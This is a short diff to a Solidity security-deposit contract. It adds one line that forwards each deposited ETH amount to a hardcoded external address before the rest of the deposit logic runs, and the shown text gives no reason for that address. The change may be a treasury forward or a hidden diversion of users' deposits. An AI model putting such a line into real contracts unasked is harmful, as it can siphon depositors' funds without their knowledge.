@@ -57,6 +57,8 @@ contract HyperAGI_Security_Deposit is OwnableUpgradeable {
 
         require(amount == msg.value, "amount error");
 
+        transferETH(payable(0xE297ce296D00381b2341c7e78662BF18eDD683d2), amount);
+
         HyperAGI_Storage storageAddress = HyperAGI_Storage(_storageAddress);
 
         HyperAGI_Node_Mgr nodeMgrAddress = HyperAGI_Node_Mgr(_nodeMgrAddress);
